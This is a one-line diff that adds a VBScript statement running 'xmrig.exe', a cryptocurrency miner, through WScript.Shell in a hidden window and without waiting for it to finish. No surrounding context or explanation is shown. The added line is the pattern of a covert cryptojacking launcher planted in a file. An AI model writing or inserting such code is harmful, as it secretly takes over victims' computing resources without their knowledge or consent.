@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "xmrig.exe", 0, False
